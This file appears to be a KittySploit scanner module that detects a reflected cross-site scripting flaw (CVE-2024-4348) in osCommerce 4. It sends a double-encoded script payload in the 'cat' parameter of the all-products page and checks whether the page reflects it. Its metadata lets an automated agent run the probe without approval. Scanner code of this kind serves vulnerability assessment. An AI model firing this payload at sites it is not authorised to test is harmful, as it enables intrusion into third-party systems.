#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A vulnerability, which was classified as problematic, was found in osCommerce 4."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'osCommerce v4.0 - Cross-site Scripting Detection',
        'description': 'A vulnerability, which was classified as problematic, was found in osCommerce 4. Affected is an unknown function of the file /catalog/all-products. The manipulation of the argument cat leads to cross site scripting. It is possible to launch the attack remotely.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'packetstorm', 'xss', 'rxss', 'oscommerce', 'cve2024', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://packetstormsecurity.com/files/178375/osCommerce-4-Cross-Site-Scripting.html',
            'https://nvd.nist.gov/vuln/detail/CVE-2024-4348',
            'https://vuldb.com/?ctiid.262488',
            'https://vuldb.com/?id.262488',
            'https://vuldb.com/?submit.320855',
        ],
        'cve': 'CVE-2024-4348',
    }

    def run(self):
        for path in ("/furniture/catalog/all-products?cat=1&bhl4n%2522%253e%253cScRiPt%253ealert%2528'document_domain'%2529%253c%252fScRiPt%253eiyehb=1", "/watch/catalog/all-products?cat=1&bhl4n%2522%253e%253cScRiPt%253ealert%2528'document_domain'%2529%253c%252fScRiPt%253eiyehb=1"):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
            body_all = ("<ScRiPt>alert('document_domain')</ScRiPt>", 'Listing of all products on the site',)
            header_any = ('text/html',)
            if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
                self.set_info(
                    severity='medium',
                    reason="osCommerce v4.0 - Cross-site Scripting detected",
                    path=path,
                )
                return True
        return False

